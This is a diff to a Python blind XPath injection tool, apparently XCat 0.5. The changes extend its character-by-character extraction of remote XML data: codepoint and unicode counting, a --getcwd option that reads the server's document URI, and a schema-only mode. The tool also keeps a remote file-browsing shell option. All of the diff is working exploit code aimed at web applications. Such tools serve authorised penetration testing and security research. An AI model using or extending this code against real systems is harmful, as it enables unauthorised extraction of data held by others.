@@ -9,33 +9,53 @@ __VERSION__ = 0.5
 
 writer = SimpleXMLWriter.XMLWriter(sys.stdout)
 
-@defer.inlineCallbacks
-def Count(payloads, node, integer=False):
-    global args
+class CountTypes:
+    LENGTH = 1
+    STRING  = 2
+    CODEPOINT = 3
 
-    if integer:
+@defer.inlineCallbacks
+def Count(payloads, node, count_type=CountTypes.STRING, _codepoint_count=None):
+    global args
+    MIN, MAX = (0, 10)
+    INC = 10
+    STEP = args.step_size
+
+    if count_type == CountTypes.LENGTH:
         search_query = "GET_COUNT_LENGTH"
         specific_query ="NODE_COUNT"
+    elif count_type == CountTypes.STRING:
+        if args.normalize_unicode:
+            search_query = "GET_COUNT_LENGTH_U"
+            specific_query = "NODE_COUNT_U"
+        else:
+            search_query = "GET_CONTENT_LENGTH"
+            specific_query = "NODEVALUE_LENGTH"
     else:
-        search_query = "GET_CONTENT_LENGTH"
-        specific_query = "NODEVALUE_LENGTH"
+        search_query = "GET_CODEPOINT_LENGTH"
+        specific_query = "GET_NODE_CODEPOINT"
+
+        #INC = 20
+        #MAX = 20
+        STEP = 20
 
     # Check if its nill first
-    test = yield payloads.RunQuery(payloads.Get(specific_query)(node=node, count=0))
+    test = yield payloads.RunQuery(payloads.Get(specific_query)(node=node, count=0, index=_codepoint_count))
     if test:
         defer.returnValue(0)
 
     # Chop it into sections
-    MIN, MAX = (0, 10)
-    for i in xrange(args.step_size):
-        r = yield payloads.RunQuery(payloads.Get(search_query)(node=node,min=MIN,max=MAX))
+
+    for i in xrange(STEP):
+        r = yield payloads.RunQuery(payloads.Get(search_query)(node=node,min=MIN,max=MAX,index=_codepoint_count))
+        #raw_input("Count: r = %s"%r)
         if not r:
-            MIN+=10
-            MAX+=10
+            MIN+=INC
+            MAX+=INC
         else:
             tlist = []
             for i in xrange(MIN, MAX+1):
-                tlist.append(payloads.RunQuery(payloads.Get(specific_query)(node=node,count=i)))
+                tlist.append(payloads.RunQuery(payloads.Get(specific_query)(node=node,index=_codepoint_count, count=i, value=chr(i))))
             results = yield defer.gatherResults(tlist)
             if not any(results):
                 defer.returnValue(0)
@@ -45,12 +65,11 @@ def Count(payloads, node, integer=False):
 @defer.inlineCallbacks
 def GetCharacters(payloads, node, size=0, count_it=False):
     if count_it:
-        size = yield Count(payloads, node=node)
+        size = yield Count(payloads, node=node, count_type=CountTypes.STRING)
         #raw_input("\nGot size %s for node %s"%(size, node))
 
     returner = []
     _counter = 0
-    _found = False
     while True:
         _counter+=1
         if not size == 0:
@@ -58,12 +77,18 @@ def GetCharacters(payloads, node, size=0, count_it=False):
                 break
 
         _found = False
-        for char in (string.ascii_letters + string.digits + " "):
-            r = yield payloads.RunQuery(payloads.Get("GET_NODE_CODEPOINT")(node=node, count=_counter, value=ord(char)))
+        if args.xversion == "1":
+            for char in (payloads.GetSearchSpace()):
+                r = yield payloads.RunQuery(payloads.Get("GET_NODE_SUBSTRING")(node=node, count=_counter, character=char))
+                if r:
+                    returner.append(char)
+                    _found = True
+        else:
+            r = yield Count(payloads, node, count_type=CountTypes.CODEPOINT, _codepoint_count=_counter)
+            #raw_input("GetCharacters: r = %s"%r)
             if r:
-                returner.append(char)
+                returner.append(chr(r))
                 _found = True
-                break
 
         if not _found:
             break
@@ -76,26 +101,29 @@ def GetXMLFromNode(payloads, node):
     global args
     #print "Node: %s"%node
     node_name = yield GetCharacters(payloads, "name(%s)"%node, count_it=True)
-    attribute_count = yield Count(payloads, node=node+"/@*", integer=True)
+    attribute_count = yield Count(payloads, node=node+"/@*", count_type=CountTypes.LENGTH)
     attributes = {}
     if attribute_count:
         for i in xrange(1, attribute_count+1):
             attribute = yield GetCharacters(payloads, "name(%s)"%(node+"/@*[%s]"%i))
-            value     = yield GetCharacters(payloads, node+"/@*[%s]"%i)
+            if not args.schema_only:
+                value     = yield GetCharacters(payloads, node+"/@*[%s]"%i)
+            else:
+                value = ""
             #raw_input("Got attribute '%s' value '%s'"%(attribute, value))
             attributes[attribute] = value
 
     writer.start(node_name, attrib=attributes)
 
     if not args.schema_only:
-        commentCount = yield Count(payloads, node+"/comment()", integer=True)
+        commentCount = yield Count(payloads, node+"/comment()", count_type=CountTypes.LENGTH)
         if commentCount:
             for i in xrange(1, commentCount+1):
                 comment = yield GetCharacters(payloads, node+"/comment()[%s]"%i, count_it=True)
                 if comment:
                     writer.comment(comment)
 
-    child_node_count = yield Count(payloads, node=node+"/*", integer=True)
+    child_node_count = yield Count(payloads, node=node+"/*", count_type=CountTypes.LENGTH)
     #print "Child node count: %s"%child_node_count
     if child_node_count:
         for i in xrange(1, child_node_count+1):
@@ -126,14 +154,23 @@ def Main(args):
         sys.exit(1)
 
     sys.stderr.write("Exploiting...\n")
-    yield GetXMLFromNode(payloads, "/*")
+    if args.getcwd:
+        if not args.xversion == "2":
+            sys.stderr.write("Working file detection is only supported in XPath 2.0")
+            sys.exit(1)
+        #payloads.SetSearchSpace(string.ascii_letters + string.punctuation + string.digits + " ")
+        cwd = yield GetCharacters(payloads, "document-uri(/)")
+        print "Working file: %s"%cwd
+    else:
+        yield GetXMLFromNode(payloads, "/*")
+    reactor.stop()
 
 
 if __name__ == "__main__":
     parser = argparse.ArgumentParser(description="Read a remote XML file through an XPath injection vulnerability")
     parser.add_argument("--method", help="HTTP method to send", action="store",
         default="GET", choices=["GET","POST"], dest="http_method")
-    parser.add_argument("--arg", help="POST argument(s) to send. The payload will be appended", type=str, action="store",
+    parser.add_argument("--arg", help="POST or GET argument(s) to send. The payload will be appended", type=str, action="store",
         dest="post_argument")
 
     group = parser.add_mutually_exclusive_group()
@@ -142,14 +179,13 @@ if __name__ == "__main__":
     group.add_argument("--error", help="Keyword that if present indicates a server error. Used for exploiting injection vectors that give no output, but can be caused to error",
         dest="error_keyword")
 
-    parser.add_argument("--schema_only", help="Only extract the node names and no data", action="store_true", dest="schema_only")
+    parser.add_argument("--schema-only", help="Only extract the node names and no text data or attribute values", action="store_true", dest="schema_only")
     parser.add_argument("--quotecharacter", help="The quote character we will use to inject (normally' or \")", default="\"", dest="quote_character")
     parser.add_argument("--executequery", help="If given recurse through this query and extract the results, instead of searching from the root node. use $COUNT to insert the current node we are looking at. eg: /users/user[$COUNT]/password",
         default="", dest="executequery")
 
     parser.add_argument("--max_search", help="The max number of characters to search to before giving up", dest="search_limit", type=int, default=20)
     parser.add_argument("--timeout", help="Socket timeout to set", type=int, default=5, dest="timeout", action="store")
-    parser.add_argument("--threadpool", help="Thread pool size for large textual items", type=int, default=10, dest="poolsize", action="store")
     parser.add_argument("--stepsize", help="When counting text contents (which could be very large) this is the max number of characters to count up to, times by ten",
         type=int, default=10, dest="step_size", action="store")
     parser.add_argument("--normalize", help="Normalize unicode", choices=["NFD","NFC","NFDK","NFKC"], action="store", dest="normalize_unicode")
@@ -169,6 +205,7 @@ if __name__ == "__main__":
 
     parser.add_argument("--notfoundstring", help="The character to place when a character cannot be found in the searchspace", action="store", dest="notfoundchar", default="?")
     parser.add_argument("--fileshell", help="Launch a shell for browing remote files", action="store_true", dest="fileshell")
+    parser.add_argument("--getcwd", help="Retrieve the XML documents URI that the server is executing our query against", action="store_true", dest="getcwd")
     parser.add_argument("--useragent", help="User agent to use", action="store", dest="user_agent", default="XCat %s"%__VERSION__)
     parser.add_argument("URL", action="store")
     args = parser.parse_args()
